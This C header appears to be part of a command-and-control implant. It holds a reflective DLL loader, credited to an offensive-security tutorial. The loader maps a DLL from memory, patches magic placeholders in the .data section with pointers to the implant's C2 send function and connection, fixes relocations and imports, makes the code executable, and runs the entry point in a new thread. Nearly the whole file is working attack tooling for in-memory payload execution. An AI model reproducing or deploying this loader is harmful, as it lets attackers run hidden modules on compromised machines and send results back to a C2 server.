#ifndef BOF_H_INCLUDED
#define BOF_H_INCLUDED
//#include <stdio.h>
#include <windows.h>
#include "../c2.h"
//code mostly from https://www.ired.team/offensive-security/code-injection-process-injection/reflective-dll-injection
typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef BOOL(WINAPI *d_DllEntry)(HINSTANCE dll, DWORD reason, LPVOID reserved);

typedef struct DLL_THREAD {
    d_DllEntry DllEntry;
    PVOID dllBase;
} DLL_THREAD, *PDLL_THREAD;
void callDll(PDLL_THREAD data){
    (data->DllEntry)((HINSTANCE)(data->dllBase), DLL_PROCESS_ATTACH, 0);
    VirtualFree(data->dllBase, 0, MEM_RELEASE);
    free(data);
}
void loadBOF(const unsigned char* dllBytes, DWORD dllSize, C2* conn){
    // basically reflective dll injection
	// get pointers to in-memory DLL headers
	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)dllBytes;
	PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((DWORD_PTR)dllBytes + dosHeaders->e_lfanew);
	SIZE_T dllImageSize = ntHeaders->OptionalHeader.SizeOfImage;

	LPVOID dllBase = VirtualAlloc(NULL, dllImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	// get delta between this module's image base and the DLL that was read into memory
	DWORD_PTR deltaImageBase = (DWORD_PTR)dllBase - (DWORD_PTR)ntHeaders->OptionalHeader.ImageBase;
	// copy over DLL image headers to the newly allocated space for the DLL
	memcpy(dllBase, dllBytes, ntHeaders->OptionalHeader.SizeOfHeaders);

	// copy over DLL image sections to the newly allocated space for the DLL
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++){
		LPVOID sectionDestination = (LPVOID)((DWORD_PTR)dllBase + (DWORD_PTR)section->VirtualAddress);
		LPVOID sectionBytes = (LPVOID)((DWORD_PTR)dllBytes + (DWORD_PTR)section->PointerToRawData);
		memcpy(sectionDestination, sectionBytes, section->SizeOfRawData);
		//patch send2
		if(strcmp(section->Name, ".data")==0){
		    unsigned char* dat = sectionDestination;
		    unsigned long long magic = 0x1337133713371337;
		    unsigned long long magic2 = 0x1337133713371338;
		    unsigned char* test = (void*)&sendC2;
		    int magicfound = 0;
		    int magic2found = 0;
		    for(int i=0;i<section->SizeOfRawData;i++){
		        if(memcmp(dat+i, &magic, 8)==0 && !magicfound){
		            memcpy(dat+i, &test, 8);
		            magicfound = 1;
	            }
	            if(memcmp(dat+i, &magic2, 8)==0 && !magic2found){
		            memcpy(dat+i, &conn, 8);
		            magic2found = 1;
	            }
		    }
	    }
		section++;
	}

	// perform image base relocations
	IMAGE_DATA_DIRECTORY relocations = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	DWORD_PTR relocationTable = relocations.VirtualAddress + (DWORD_PTR)dllBase;
	DWORD relocationsProcessed = 0;

	while (relocationsProcessed < relocations.Size){
		PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)(relocationTable + relocationsProcessed);
		relocationsProcessed += sizeof(BASE_RELOCATION_BLOCK);
		DWORD relocationsCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
		PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)(relocationTable + relocationsProcessed);

		for (DWORD i = 0; i < relocationsCount; i++){
			relocationsProcessed += sizeof(BASE_RELOCATION_ENTRY);

			if (relocationEntries[i].Type == 0)
				continue;

			DWORD_PTR relocationRVA = relocationBlock->PageAddress + relocationEntries[i].Offset;
			DWORD_PTR addressToPatch = 0;
			memcpy(&addressToPatch, (LPCVOID)((DWORD_PTR)dllBase + relocationRVA), sizeof(DWORD_PTR));
			addressToPatch += deltaImageBase;
			memcpy((PVOID)((DWORD_PTR)dllBase + relocationRVA), &addressToPatch, sizeof(DWORD_PTR));
		}
	}
	
	// resolve import address table
	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)dllBase);
	LPCSTR libraryName = "";
	HMODULE library = NULL;

	while (importDescriptor->Name != 0){
		libraryName = (LPCSTR)(long long)importDescriptor->Name + (DWORD_PTR)dllBase;
		library = LoadLibraryA(libraryName);
		
		if (library){
			PIMAGE_THUNK_DATA thunk = NULL;
			thunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)dllBase + importDescriptor->FirstThunk);

			while (thunk->u1.AddressOfData != 0){
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)){
					LPCSTR functionOrdinal = (LPCSTR)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (DWORD_PTR)GetProcAddress(library, functionOrdinal);
				}else{
					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)dllBase + thunk->u1.AddressOfData);
					DWORD_PTR functionAddress = (DWORD_PTR)GetProcAddress(library, functionName->Name);
					thunk->u1.Function = functionAddress;
				}
				++thunk;
			}
		}
		importDescriptor++;
	}
	PIMAGE_SECTION_HEADER text = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD old = 0;
    VirtualProtect(dllBase+(text->VirtualAddress), text->SizeOfRawData, PAGE_EXECUTE_READ, &old);
	// execute the loaded DLL
	d_DllEntry DllEntry = (d_DllEntry)((DWORD_PTR)dllBase + ntHeaders->OptionalHeader.AddressOfEntryPoint);
	PDLL_THREAD thd = calloc(sizeof(DLL_THREAD), 1);
	thd->DllEntry = DllEntry;
	thd->dllBase = dllBase;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)callDll, thd, 0, NULL);
}
#endif